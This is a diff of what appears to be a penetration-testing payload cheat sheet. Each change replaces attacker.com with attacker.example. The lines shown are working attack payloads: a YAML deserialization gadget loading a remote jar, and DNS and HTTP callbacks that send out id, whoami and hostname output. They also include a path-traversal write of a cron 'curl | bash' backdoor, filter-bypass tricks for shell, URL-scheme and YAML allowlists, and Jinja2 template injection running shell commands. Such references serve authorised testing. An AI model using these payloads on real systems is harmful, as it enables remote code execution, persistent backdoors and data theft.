@@ -189,7 +189,7 @@ The `new String[]{"...", "..."}` array form avoids shell-quoting issues that bre
 ```yaml
 !!javax.script.ScriptEngineManager [
   !!java.net.URLClassLoader [[
-    !!java.net.URL ["http://attacker.com/exploit.jar"]
+    !!java.net.URL ["http://attacker.example/exploit.jar"]
   ]]
 ]
 ```
@@ -226,8 +226,8 @@ kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespa
 ```bash
 # Payload to confirm blind RCE via DNS
 curl "http://$(id | base64).YOUR-INTERACTSH-URL/"
-nslookup $(whoami).attacker.com
-wget http://attacker.com/$(cat /etc/hostname)
+nslookup $(whoami).attacker.example
+wget http://attacker.example/$(cat /etc/hostname)
 ```
 
 ### ActiveStorage Path Traversal → RCE
@@ -235,7 +235,7 @@ wget http://attacker.com/$(cat /etc/hostname)
 # Filename in upload request
 filename="../../../../etc/cron.d/backdoor"
 # Cron payload content
-* * * * * root curl http://attacker.com/shell | bash
+* * * * * root curl http://attacker.example/shell | bash
 ```
 
 ### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)
@@ -330,7 +330,7 @@ $'\x63\x61\x74' /etc/passwd  # hex encoding
 $(printf '\x63\x61\x74') /etc/passwd
 
 # Newline injection when semicolons blocked
-payload=$'\ncurl attacker.com\n'
+payload=$'\ncurl attacker.example\n'
 ```
 
 ### Bypass: URL scheme allowlist (javascript: blocked)
@@ -339,7 +339,7 @@ payload=$'\ncurl attacker.com\n'
 jAvAsCrIpT:alert(1)          # case variation
 javascript&#58;alert(1)      # HTML entity
 javascript:void(alert(1))    # void wrapper
-intent://attacker.com#Intent;scheme=javascript;...
+intent://attacker.example#Intent;scheme=javascript;...
 data:text/html,<script>alert(1)</script>
 ```
 
@@ -347,7 +347,7 @@ data:text/html,<script>alert(1)</script>
 ```yaml
 # If !!java.* is blocked, try legitimate classes with side effects
 !!com.sun.rowset.JdbcRowSetImpl
-  dataSourceName: 'ldap://attacker.com/a'
+  dataSourceName: 'ldap://attacker.example/a'
   autoCommit: true
 # Or find allowlisted types with dangerous constructors
 ```
@@ -376,7 +376,7 @@ data:text/html,<script>alert(1)</script>
 # If {{ }} is sanitized on output but not evaluation:
 {% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}
 # Blind — use DNS callback instead of output
-{{ lipsum.__globals__.os.popen('nslookup $(id).attacker.com').read() }}
+{{ lipsum.__globals__.os.popen('nslookup $(id).attacker.example').read() }}
 ```
 
 ### Bypass: WAF blocking `exec`, `system`, `popen`
